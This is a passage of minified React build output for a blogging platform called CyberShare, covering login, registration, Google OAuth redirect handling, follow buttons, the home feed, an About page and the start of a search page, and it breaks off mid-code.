o.jsxs("div",{className:"min-h-screen flex flex-col",children:[o.jsx(S_,{}),o.jsx("main",{className:`flex-1 transition-all duration-300 ${e?"md:ml-64":"ml-0"}`,children:o.jsx(Qw,{})}),o.jsx(N_,{})]})}const D_=`http://localhost:8080/oauth2/authorize/google?redirect_uri=${encodeURIComponent(window.location.origin+"/oauth2/redirect")}`;function L_(){const e=Ln(),[t]=Qu(),{login:n}=Gt(),[r,a]=j.useState(!1),[l,u]=j.useState(""),[f,h]=j.useState({email:"",password:""});j.useEffect(()=>{const b=t.get("error");b&&u(b)},[t]);const m=b=>{h({...f,[b.target.name]:b.target.value}),u("")},x=async b=>{var E,C;b.preventDefault(),a(!0),u("");try{await n(f),e("/")}catch(P){u(((C=(E=P.response)==null?void 0:E.data)==null?void 0:C.message)||"Invalid credentials. Please try again.")}finally{a(!1)}},g=()=>{window.location.href=D_};return o.jsx("div",{className:"min-h-screen flex items-center justify-center bg-gray-50 py-12 px-4 sm:px-6 lg:px-8",children:o.jsxs("div",{className:"max-w-md w-full space-y-8",children:[o.jsxs("div",{children:[o.jsx("h2",{className:"mt-6 text-center text-3xl font-extrabold text-gray-900",children:"Sign in to your account"}),o.jsxs("p",{className:"mt-2 text-center text-sm text-gray-600",children:["Or"," ",o.jsx(we,{to:"/register",className:"font-medium text-blue-600 hover:text-blue-500",children:"create a new account"})]})]}),o.jsx("div",{children:o.jsxs("button",{type:"button",onClick:g,className:"w-full flex items-center justify-center gap-3 px-4 py-2 border border-gray-300 rounded-md shadow-sm bg-white text-gray-700 hover:bg-gray-50 transition-colors",children:[o.jsxs("svg",{className:"w-5 h-5",viewBox:"0 0 24 24",children:[o.jsx("path",{fill:"#4285F4",d:"M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"}),o.jsx("path",{fill:"#34A853",d:"M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"}),o.jsx("path",{fill:"#FBBC05",d:"M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"}),o.jsx("path",{fill:"#EA4335",d:"M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"})]}),"Continue with Google"]})}),o.jsxs("div",{className:"relative",children:[o.jsx("div",{className:"absolute inset-0 flex items-center",children:o.jsx("div",{className:"w-full border-t border-gray-300"})}),o.jsx("div",{className:"relative flex justify-center text-sm",children:o.jsx("span",{className:"px-2 bg-gray-50 text-gray-500",children:"Or continue with email"})})]}),o.jsxs("form",{className:"mt-8 space-y-6",onSubmit:x,children:[l&&o.jsx("div",{className:"rounded-md bg-red-50 p-4",children:o.jsx("div",{className:"text-sm text-red-800",children:l})}),o.jsxs("div",{className:"rounded-md shadow-sm space-y-4",children:[o.jsxs("div",{children:[o.jsx("label",{htmlFor:"email",className:"block text-sm font-medium text-gray-700",children:"Email"}),o.jsx("input",{id:"email",name:"email",type:"email",required:!0,className:"mt-1 appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm",placeholder:"Email address",value:f.email,onChange:m})]}),o.jsxs("div",{children:[o.jsx("label",{htmlFor:"password",className:"block text-sm font-medium text-gray-700",children:"Password"}),o.jsx("input",{id:"password",name:"password",type:"password",required:!0,className:"mt-1 appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm",placeholder:"Password",value:f.password,onChange:m})]})]}),o.jsx("div",{className:"flex items-center justify-between",children:o.jsx("div",{className:"text-sm",children:o.jsx(we,{to:"/forgot-password",className:"font-medium text-blue-600 hover:text-blue-500",children:"Forgot your password?"})})}),o.jsx("div",{children:o.jsx(Ee,{type:"submit",className:"w-full",disabled:r,children:r?"Signing in...":"Sign in"})})]})]})})}function __(){const e=Ln(),{register:t}=Gt(),[n,r]=j.useState(!1),[a,l]=j.useState(""),[u,f]=j.useState({username:"",email:"",password:"",displayName:""}),h=x=>{f({...u,[x.target.name]:x.target.value}),l("")},m=async x=>{var g,b;x.preventDefault(),r(!0),l("");try{await t(u),e("/")}catch(E){l(((b=(g=E.response)==null?void 0:g.data)==null?void 0:b.message)||"Registration failed. Please try again.")}finally{r(!1)}};return o.jsx("div",{className:"min-h-screen flex items-center justify-center bg-gray-50 py-12 px-4 sm:px-6 lg:px-8",children:o.jsxs("div",{className:"max-w-md w-full space-y-8",children:[o.jsxs("div",{children:[o.jsx("h2",{className:"mt-6 text-center text-3xl font-extrabold text-gray-900",children:"Create your account"}),o.jsxs("p",{className:"mt-2 text-center text-sm text-gray-600",children:["Or"," ",o.jsx(we,{to:"/login",className:"font-medium text-blue-600 hover:text-blue-500",children:"sign in to your account"})]})]}),o.jsxs("form",{className:"mt-8 space-y-6",onSubmit:m,children:[a&&o.jsx("div",{className:"rounded-md bg-red-50 p-4",children:o.jsx("div",{className:"text-sm text-red-800",children:a})}),o.jsxs("div",{className:"rounded-md shadow-sm space-y-4",children:[o.jsxs("div",{children:[o.jsx("label",{htmlFor:"username",className:"block text-sm font-medium text-gray-700",children:"Username"}),o.jsx("input",{id:"username",name:"username",type:"text",minLength:3,maxLength:50,className:"mt-1 appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm",placeholder:"Username (optional - auto-generated if empty)",value:u.username,onChange:h})]}),o.jsxs("div",{children:[o.jsx("label",{htmlFor:"email",className:"block text-sm font-medium text-gray-700",children:"Email address"}),o.jsx("input",{id:"email",name:"email",type:"email",required:!0,className:"mt-1 appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm",placeholder:"Email address",value:u.email,onChange:h})]}),o.jsxs("div",{children:[o.jsx("label",{htmlFor:"displayName",className:"block text-sm font-medium text-gray-700",children:"Display Name"}),o.jsx("input",{id:"displayName",name:"displayName",type:"text",maxLength:100,className:"mt-1 appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm",placeholder:"Display Name",value:u.displayName,onChange:h})]}),o.jsxs("div",{children:[o.jsx("label",{htmlFor:"password",className:"block text-sm font-medium text-gray-700",children:"Password"}),o.jsx("input",{id:"password",name:"password",type:"password",required:!0,minLength:6,className:"mt-1 appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm",placeholder:"Password (min 6 characters)",value:u.password,onChange:h})]})]}),o.jsx("div",{children:o.jsx(Ee,{type:"submit",className:"w-full",disabled:n,children:n?"Creating account...":"Register"})})]})]})})}function I_(){const e=Ln(),[t]=Qu(),{setTokensFromOAuth:n}=Gt();return j.useEffect(()=>{const r=t.get("token"),a=t.get("refreshToken"),l=t.get("error");if(l){e("/login?error="+encodeURIComponent(l));return}r&&a?(n(r,a),e("/")):e("/login?error=OAuth2 authentication failed")},[t,e,n]),o.jsx("div",{className:"min-h-screen flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900 mx-auto"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Completing sign in..."})]})})}function w0({post:e}){var t,n;return o.jsx("article",{className:"group",children:o.jsxs(we,{to:`/post/${e.slug}`,children:[o.jsx("div",{className:"relative w-full aspect-video bg-gray-200 rounded-sm overflow-hidden mb-3",children:e.coverImageUrl?o.jsx("img",{src:e.coverImageUrl,alt:e.title,className:"w-full h-full object-cover group-hover:scale-105 transition-transform duration-300"}):o.jsx("div",{className:"w-full h-full flex items-center justify-center bg-gradient-to-br from-blue-500 to-purple-600",children:o.jsx("span",{className:"text-white text-3xl font-bold",children:((t=e.title)==null?void 0:t.charAt(0))||"C"})})}),o.jsxs("div",{className:"space-y-2",children:[o.jsx("h3",{className:"font-bold text-base text-gray-900 line-clamp-2 group-hover:text-blue-600 transition-colors leading-snug",children:e.title}),o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-500",children:[e.authorAvatarUrl?o.jsx("img",{src:e.authorAvatarUrl,alt:e.authorDisplayName,className:"w-5 h-5 rounded-full object-cover"}):o.jsx("div",{className:"w-5 h-5 rounded-full bg-gray-300 flex items-center justify-center text-gray-600 text-xs font-semibold",children:((n=e.authorDisplayName)==null?void 0:n.charAt(0))||"U"}),o.jsx("span",{className:"font-medium text-gray-700",children:e.authorDisplayName}),o.jsx("span",{children:""}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(kn,{className:"w-3 h-3"}),o.jsx("span",{children:e.views||0})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(cr,{className:"w-3 h-3"}),o.jsx("span",{children:e.likesCount||0})]})]})]})]})})}function P_({post:e,index:t}){var n,r;return o.jsxs("article",{className:"flex gap-4 py-4 border-b border-gray-100 last:border-0",children:[t!==void 0&&o.jsx("div",{className:"flex-shrink-0 w-8 text-2xl font-bold text-gray-200",children:String(t+1).padStart(2,"0")}),o.jsxs("div",{className:"flex-1 min-w-0",children:[o.jsxs(we,{to:`/author/${e.authorUsername}`,className:"flex items-center gap-2 mb-2 hover:opacity-80 w-fit",children:[e.authorAvatarUrl?o.jsx("img",{src:e.authorAvatarUrl,alt:e.authorDisplayName,className:"w-6 h-6 rounded-full object-cover"}):o.jsx("div",{className:"w-6 h-6 rounded-full bg-gray-300 flex items-center justify-center text-gray-600 text-xs font-semibold",children:((n=e.authorDisplayName)==null?void 0:n.charAt(0))||"U"}),o.jsx("span",{className:"text-sm text-gray-600 font-medium",children:e.authorDisplayName})]}),o.jsx(we,{to:`/post/${e.slug}`,children:o.jsx("h3",{className:"font-bold text-gray-900 hover:text-blue-600 transition-colors line-clamp-2 mb-1",children:e.title})}),o.jsxs("div",{className:"flex items-center gap-3 text-xs text-gray-500",children:[e.publishedAt&&o.jsx("time",{dateTime:e.publishedAt,children:Ui(new Date(e.publishedAt),"MMM dd")}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(kn,{className:"h-3 w-3"}),o.jsx("span",{children:((r=e.views)==null?void 0:r.toLocaleString())||0})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(cr,{className:"h-3 w-3"}),o.jsx("span",{children:e.likesCount||0})]})]})]}),e.coverImageUrl&&o.jsx(we,{to:`/post/${e.slug}`,className:"flex-shrink-0",children:o.jsx("img",{src:e.coverImageUrl,alt:e.title,className:"w-16 h-16 object-cover rounded"})})]})}function Hf({post:e}){var t;return o.jsx("article",{className:"bg-white rounded-lg shadow-sm hover:shadow-md transition-shadow overflow-hidden",children:o.jsx(we,{to:`/post/${e.slug}`,className:"block",children:o.jsxs("div",{className:"flex flex-col md:flex-row",children:[e.coverImageUrl&&o.jsx("div",{className:"md:w-64 h-48 md:h-auto bg-gray-200",children:o.jsx("img",{src:e.coverImageUrl,alt:e.title,className:"w-full h-full object-cover"})}),o.jsxs("div",{className:"flex-1 p-6",children:[o.jsxs("div",{className:"flex items-center gap-2 mb-3 flex-wrap",children:[e.categoryName&&o.jsx("span",{className:"px-2 py-1 bg-gray-100 text-gray-600 rounded text-xs font-medium",children:e.categoryName}),e.tags&&e.tags.length>0&&e.tags.slice(0,3).map(n=>o.jsxs(we,{to:`/tag/${n.slug||n.name||n}`,onClick:r=>r.stopPropagation(),className:"px-2 py-1 bg-gray-100 text-gray-600 rounded text-xs font-medium hover:bg-gray-200 transition-colors",children:["#",n.name||n]},n.id||n.name||n))]}),o.jsx("h3",{className:"text-2xl font-bold text-gray-900 mb-2 hover:text-blue-600",children:e.title}),e.summary&&o.jsx("p",{className:"text-gray-600 mb-4 line-clamp-2",children:e.summary}),o.jsxs(we,{to:`/author/${e.authorUsername}`,onClick:n=>n.stopPropagation(),className:"flex items-center gap-2 mb-3 hover:opacity-80 w-fit",children:[e.authorAvatarUrl?o.jsx("img",{src:e.authorAvatarUrl,alt:e.authorDisplayName,className:"w-8 h-8 rounded-full object-cover"}):o.jsx("div",{className:"w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center text-white text-sm font-semibold",children:((t=e.authorDisplayName)==null?void 0:t.charAt(0))||"U"}),o.jsx("span",{className:"text-sm text-gray-700 font-medium",children:e.authorDisplayName})]}),o.jsxs("div",{className:"flex items-center gap-4 text-sm text-gray-500",children:[e.publishedAt&&o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(Zu,{className:"h-4 w-4"}),o.jsx("time",{dateTime:e.publishedAt,children:Ui(new Date(e.publishedAt),"MMM dd, yyyy")})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(kn,{className:"h-4 w-4"}),o.jsx("span",{children:(e.views||0).toLocaleString()})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(cr,{className:"h-4 w-4"}),o.jsx("span",{children:e.likesCount||0})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(cf,{className:"h-4 w-4"}),o.jsx("span",{children:e.commentsCount||0})]})]})]})]})})})}function Zg(e){const{user:t,isAuthenticated:n}=Gt(),[r,a]=j.useState(!1),[l,u]=j.useState(0),[f,h]=j.useState(0),[m,x]=j.useState(!1),[g,b]=j.useState(!0),E=(t==null?void 0:t.username)===e;j.useEffect(()=>{if(!e)return;(async()=>{b(!0);try{const T=await _e.get(`/api/users/${e}/follow-stats`);if(u(T.data.followers||0),h(T.data.following||0),n&&!E){const A=await _e.get(`/api/follows/${e}/check`);a(A.data.isFollowing)}}catch(T){console.error("Failed to fetch follow data:",T)}finally{b(!1)}})()},[e,n,E]);const C=j.useCallback(async()=>{var N,T;if(!(!n||E||m)){x(!0);try{await _e.post(`/api/follows/${e}`),a(!0),u(A=>A+1)}catch(A){console.error("Failed to follow:",A),(T=(N=A.response)==null?void 0:N.data)!=null&&T.message&&alert(A.response.data.message)}finally{x(!1)}}},[e,n,E,m]),P=j.useCallback(async()=>{var N,T;if(!(!n||E||m)){x(!0);try{await _e.delete(`/api/follows/${e}`),a(!1),u(A=>Math.max(0,A-1))}catch(A){console.error("Failed to unfollow:",A),(T=(N=A.response)==null?void 0:N.data)!=null&&T.message&&alert(A.response.data.message)}finally{x(!1)}}},[e,n,E,m]),O=j.useCallback(()=>{r?P():C()},[r,C,P]);return{isFollowing:r,followersCount:l,followingCount:f,loading:m,initialLoading:g,isOwnProfile:E,handleFollow:C,handleUnfollow:P,toggleFollow:O}}function Uf({username:e,variant:t="default",size:n="default",showIcon:r=!0,className:a=""}){const{isAuthenticated:l}=Gt(),u=Ln(),{isFollowing:f,loading:h,initialLoading:m,isOwnProfile:x,toggleFollow:g}=Zg(e);if(x)return null;const b=()=>{if(!l){u("/login");return}g()};return m?o.jsx(Ee,{variant:t,size:n,disabled:!0,className:a,children:o.jsx(b0,{className:"h-4 w-4 animate-spin"})}):o.jsx(Ee,{variant:f?"outline":t,size:n,onClick:b,disabled:h,className:`gap-2 ${f?"hover:bg-red-50 hover:text-red-600 hover:border-red-200":""} ${a}`,children:h?o.jsx(b0,{className:"h-4 w-4 animate-spin"}):o.jsxs(o.Fragment,{children:[r&&(f?o.jsx(T_,{className:"h-4 w-4"}):o.jsx(Xg,{className:"h-4 w-4"})),f?"Following":"Follow"]})})}function j_(){const{isAuthenticated:e}=Gt(),[t,n]=j.useState([]),[r,a]=j.useState([]),[l,u]=j.useState([]),[f,h]=j.useState([]),[m,x]=j.useState([]),[g,b]=j.useState([]),[E,C]=j.useState([]),[P,O]=j.useState([]),[N,T]=j.useState(!0),[A,_]=j.useState("latest"),[M,R]=j.useState(0),[B,U]=j.useState(0);j.useEffect(()=>{$()},[e]),j.useEffect(()=>{Y()},[A,M]);const $=async()=>{T(!0);try{const Z=[_e.get("/api/categories"),_e.get("/api/posts/trending",{params:{size:8}}),_e.get("/api/users/top-authors",{params:{limit:5}}),_e.get("/api/posts/trending",{params:{size:8}}),_e.get("/api/tags/top",{params:{limit:10}}),_e.get("/api/categories/top",{params:{limit:8}})];e&&Z.push(_e.get("/api/posts/feed",{params:{size:4}}));const me=await Promise.all(Z);n(me[0].data||[]),a(me[1].data.content||[]),x(me[2].data||[]),b(me[3].data.content||[]),C(me[4].data||[]),O(me[5].data||[]),e&&me[6]&&u(me[6].data.content||[])}catch(Z){console.error("Failed to fetch data:",Z)}finally{T(!1)}},Y=async()=>{try{let Z="publishedAt,desc";A==="views"?Z="views,desc":A==="likes"&&(Z="likesCount,desc");let me;A==="trending"?me=await _e.get("/api/posts/trending",{params:{page:M,size:10}}):me=await _e.get("/api/posts",{params:{page:M,size:10,sort:Z}}),h(me.data.content||[]),U(me.data.totalPages||0)}catch(Z){console.error("Failed to fetch posts:",Z)}},ne=Z=>{_(Z),R(0)};return N?o.jsx("div",{className:"min-h-screen flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading..."})]})}):o.jsxs("div",{className:"min-h-screen bg-gray-50",children:[o.jsx("div",{className:"border-b border-gray-200 bg-white sticky top-[57px] z-10",children:o.jsx("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 py-3",children:o.jsxs("div",{className:"flex gap-2 sm:gap-3 overflow-x-auto scrollbar-hide pb-1",children:[o.jsx(we,{to:"/",className:"px-4 py-1.5 rounded-full text-sm font-medium whitespace-nowrap bg-gray-900 text-white",children:"All"}),t.map(Z=>o.jsx(we,{to:`/category/${Z.slug||Z.name.toLowerCase()}`,className:"px-4 py-1.5 rounded-full text-sm font-medium whitespace-nowrap transition-colors bg-gray-100 text-gray-700 hover:bg-gray-200",children:Z.name},Z.id))]})})}),o.jsx("section",{className:"bg-white border-b",children:o.jsxs("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8",children:[o.jsxs("div",{className:"flex items-center gap-2 mb-4 sm:mb-6",children:[o.jsx(ju,{className:"h-5 w-5 text-orange-500"}),o.jsx("h2",{className:"text-xl sm:text-2xl font-bold text-gray-900",children:"Trending"}),o.jsxs(we,{to:"/trending",className:"ml-auto text-sm text-blue-600 hover:text-blue-700 flex items-center gap-1",children:["View all ",o.jsx(tb,{className:"h-4 w-4"})]})]}),o.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6",children:r.slice(0,8).map(Z=>o.jsx(w0,{post:Z},Z.id))})]})}),e&&l.length>0&&o.jsx("section",{className:"bg-gray-50 border-b",children:o.jsxs("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8",children:[o.jsxs("div",{className:"flex items-center gap-2 mb-4 sm:mb-6",children:[o.jsx(Mi,{className:"h-5 w-5 text-blue-500"}),o.jsx("h2",{className:"text-xl sm:text-2xl font-bold text-gray-900",children:"From People You Follow"}),o.jsxs(we,{to:"/feed",className:"ml-auto text-sm text-blue-600 hover:text-blue-700 flex items-center gap-1",children:["View all ",o.jsx(tb,{className:"h-4 w-4"})]})]}),o.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6",children:l.slice(0,4).map(Z=>o.jsx(w0,{post:Z},Z.id))})]})}),o.jsx("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 py-6 sm:py-8",children:o.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8",children:[o.jsxs("div",{className:"lg:col-span-2",children:[o.jsx("div",{className:"bg-white rounded-lg shadow-sm mb-6",children:o.jsxs("div",{className:"flex border-b overflow-x-auto",children:[o.jsxs("button",{onClick:()=>ne("latest"),className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${A==="latest"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(Yg,{className:"h-4 w-4"}),"Latest"]}),o.jsxs("button",{onClick:()=>ne("views"),className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${A==="views"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(kn,{className:"h-4 w-4"}),"Most Viewed"]}),o.jsxs("button",{onClick:()=>ne("likes"),className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${A==="likes"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(cr,{className:"h-4 w-4"}),"Most Liked"]}),o.jsxs("button",{onClick:()=>ne("trending"),className:`flex items-center gap-2 px-5 py-3 text-sm font-medium whitespace-nowrap transition-colors ${A==="trending"?"text-blue-600 border-b-2 border-blue-600":"text-gray-500 hover:text-gray-700"}`,children:[o.jsx(x0,{className:"h-4 w-4"}),"Trending"]})]})}),o.jsx("div",{className:"space-y-4",children:f.map(Z=>o.jsx(Hf,{post:Z},Z.id))}),f.length===0&&o.jsx("div",{className:"bg-white rounded-lg shadow-sm p-8 text-center",children:o.jsx("p",{className:"text-gray-500",children:"No posts yet"})}),B>1&&o.jsxs("div",{className:"flex justify-center gap-2 mt-8",children:[o.jsx(Ee,{variant:"outline",onClick:()=>R(Z=>Math.max(0,Z-1)),disabled:M===0,children:"Previous"}),o.jsxs("span",{className:"flex items-center px-4 text-gray-700",children:[M+1," / ",B]}),o.jsx(Ee,{variant:"outline",onClick:()=>R(Z=>Math.min(B-1,Z+1)),disabled:M>=B-1,children:"Next"})]})]}),o.jsxs("div",{className:"hidden lg:block lg:col-span-1 space-y-6",children:[o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-4",children:[o.jsxs("h3",{className:"font-bold text-gray-900 mb-4 flex items-center gap-2",children:[o.jsx(Mi,{className:"h-4 w-4 text-blue-500"}),"Top Authors"]}),o.jsx("div",{className:"space-y-3",children:m.map(Z=>{var me;return o.jsxs("div",{className:"flex items-center gap-3",children:[o.jsx(we,{to:`/author/${Z.username}`,children:Z.avatarUrl?o.jsx("img",{src:Z.avatarUrl,alt:Z.displayName,className:"w-10 h-10 rounded-full object-cover"}):o.jsx("div",{className:"w-10 h-10 rounded-full bg-gray-200 flex items-center justify-center text-gray-600 font-semibold",children:((me=Z.displayName)==null?void 0:me.charAt(0))||"U"})}),o.jsxs("div",{className:"flex-1 min-w-0",children:[o.jsx(we,{to:`/author/${Z.username}`,children:o.jsx("p",{className:"font-medium text-gray-900 truncate hover:text-blue-600",children:Z.displayName})}),o.jsxs("p",{className:"text-xs text-gray-500 truncate",children:["@",Z.username]})]}),o.jsx(Uf,{username:Z.username,variant:"outline",size:"sm",showIcon:!1})]},Z.id)})})]}),o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-4",children:[o.jsxs("h3",{className:"font-bold text-gray-900 mb-4 flex items-center gap-2",children:[o.jsx(x0,{className:"h-4 w-4 text-orange-500"}),"Top Trending"]}),o.jsx("div",{className:"divide-y divide-gray-100",children:g.slice(0,8).map((Z,me)=>o.jsx(P_,{post:Z,index:me},Z.id))})]}),o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-4",children:[o.jsxs("h3",{className:"font-bold text-gray-900 mb-4 flex items-center gap-2",children:[o.jsx(E0,{className:"h-4 w-4 text-green-500"}),"Popular Tags"]}),o.jsx("div",{className:"flex flex-wrap gap-2",children:E.map(Z=>o.jsxs(we,{to:`/tag/${Z.slug||Z.name.toLowerCase()}`,className:"inline-flex items-center gap-1 px-3 py-1.5 bg-gray-100 hover:bg-gray-200 text-gray-700 text-sm rounded-full transition-colors",children:["#",Z.name,Z.postCount>0&&o.jsxs("span",{className:"text-xs text-gray-500",children:["(",Z.postCount,")"]})]},Z.id))})]}),o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-4",children:[o.jsxs("h3",{className:"font-bold text-gray-900 mb-4 flex items-center gap-2",children:[o.jsx(xl,{className:"h-4 w-4 text-purple-500"}),"Top Categories"]}),o.jsx("div",{className:"space-y-2",children:P.map(Z=>o.jsxs(we,{to:`/category/${Z.slug||Z.name.toLowerCase()}`,className:"flex items-center justify-between py-2 px-3 hover:bg-gray-50 rounded-lg transition-colors group",children:[o.jsx("span",{className:"text-gray-700 group-hover:text-blue-600 font-medium",children:Z.name}),o.jsxs("span",{className:"text-sm text-gray-400 group-hover:text-blue-500",children:[Z.postCount||0," posts"]})]},Z.id))})]})]})]})})]})}function R_(){return o.jsx("div",{className:"container mx-auto px-4 py-12",children:o.jsxs("div",{className:"max-w-3xl mx-auto",children:[o.jsx("h1",{className:"text-4xl font-bold mb-6",children:"About CyberShare"}),o.jsxs("div",{className:"prose prose-lg dark:prose-invert",children:[o.jsx("p",{className:"text-muted-foreground text-lg mb-4",children:"CyberShare is a modern social blogging platform designed to bring writers and readers together."}),o.jsx("h2",{className:"text-2xl font-semibold mt-8 mb-4",children:"Technology Stack"}),o.jsxs("ul",{className:"list-disc list-inside space-y-2 text-muted-foreground",children:[o.jsxs("li",{children:[o.jsx("strong",{children:"Frontend:"})," React 18, Vite, TailwindCSS, Shadcn UI"]}),o.jsxs("li",{children:[o.jsx("strong",{children:"Backend:"})," Spring Boot 3.5, Spring Security, JPA/Hibernate"]}),o.jsxs("li",{children:[o.jsx("strong",{children:"Database:"})," MySQL with Flyway migrations"]}),o.jsxs("li",{children:[o.jsx("strong",{children:"Authentication:"})," JWT + Refresh Token, OAuth2 (Google)"]})]}),o.jsx("h2",{className:"text-2xl font-semibold mt-8 mb-4",children:"Features (Planned)"}),o.jsxs("ul",{className:"list-disc list-inside space-y-2 text-muted-foreground",children:[o.jsx("li",{children:"User authentication and authorization"}),o.jsx("li",{children:"Rich text editor with Markdown support"}),o.jsx("li",{children:"Social interactions (likes, comments, bookmarks)"}),o.jsx("li",{children:"Follow system and personalized feed"}),o.jsx("li",{children:"Real-time notifications"}),o.jsx("li",{children:"Content moderation and admin panel"}),o.jsx("li",{children:"Search and discovery features"})]}),o.jsx("h2",{className:"text-2xl font-semibold mt-8 mb-4",children:"Development Status"}),o.jsxs("div",{className:"bg-muted p-4 rounded-lg",children:[o.jsx("p",{className:"font-semibold text-green-600 dark:text-green-400",children:" Phase 0 - Project Initialization (Complete)"}),o.jsx("p",{className:"text-sm text-muted-foreground mt-2",children:"Backend skeleton with Swagger, health check, and database migration is running. Frontend is set up with routing and basic components."})]})]})]})})}function O_(){const[e]=Qu(),t=e.get("q")||"",[n,r]=j.useState("stories"),[a,l]=j.useState([]),[u,f]=j.useState([]),[h,m]=j.useState([]),[x,g]=j.useState(!1),[b,E]=j.useState(0),[C,P]=j.useState(0);j.useEffect(()=>{t&&(E(0),n==="stories"?O():n==="authors"?N():n==="categories"&&T())},[t,n]),j.useEffect(()=>{t&&n==="stories"&&b>0&&O()},[b]);const O=async()=>{if(t.trim())try{g(!0);const _=await _e.get("/api/posts/search",{params:{q:t,page:b,size:10}});l(b===0?_.data.content:M=>[...M,..._.data.content]),P(_.data.totalPages)}catch(_){console.error("Failed to search posts:",_)}finally{g(!1)}},N=async()=>{if(t.trim())try{g(!0);const _=await _e.get("/api/users/search",{params:{q:t,size:20}});f(_.data.content||_.data||[])}catch(_){console.error("Failed to search authors:",_),f([])}finally{g(!1)}},T=async()=>{if(t.trim())try{g(!0);const R=((await _e.get("/api/categories")).data||[]).filter(B=>B.name.toLowerCase().includes(t.toLowerCase())||B.description&&B.description.toLowerCase().includes(t.toLowerCase()));m(R)}catch(_){console.error("Failed to search categories:",_),m([])}finally{g(!1)}},A=async()=>{b>=C-1||E(b+1)};return t?o.jsx("div",{className:"min-h-screen bg-white",children:o.jsxs("div",{className:"max-w-4xl mx-auto px-6 py-8",children:[o.jsx("div",{className:"mb-6",children:o.jsxs("h1",{className:"text-3xl font-normal text-gray-900 mb-2",children:["Results for ",o.jsx("span",{className:"font-semibold",children:t})]})}),o.jsx("div",{className:"border-b border-gray-200 mb-8",children:o.jsxs("nav",{className:"flex gap-8",children:[o.jsxs("button",{onClick:()=>r("stories"),className:`pb-3 text-sm font-medium border-b-2 transition-colors flex items-center gap-2 ${n==="stories"?"border-gray-900 text-gray-900":"border-transparent text-gray-500 hover:text-gray-700"}`,children:[o.jsx(Xr,{className:"h-4 w-4"}),"Stories"]}),o.jsxs("button",{onClick:()=>r("authors"),className:`pb-3 text-sm font-medium border-b-2 transition-colors flex items-center gap-2 ${n==="authors"?"border-gray-900 text-gray-900":"border-transparent text-gray-500 hover:text-gray-700"}`,children:[o.jsx(ff,{className:"h-4 w-4"}),"Authors"]}),o.jsxs("button",{onClick:()=>r("categories"),className:`pb-3 text-sm font-medium border-b-2 transition-colors flex items-center gap-2 ${n==="categories"?"border-gray-900 text-gray-900":"border-transparent text-gray-500 hover:text-gray-700"}`,children:[o.jsx(xl,{className:"h-4 w-4"}),"Categories"]})]})}),n==="stories"&&o.jsx("div",{className:"space-y-8",children:x&&a.length===0?o.jsx("div",{className:"text-center 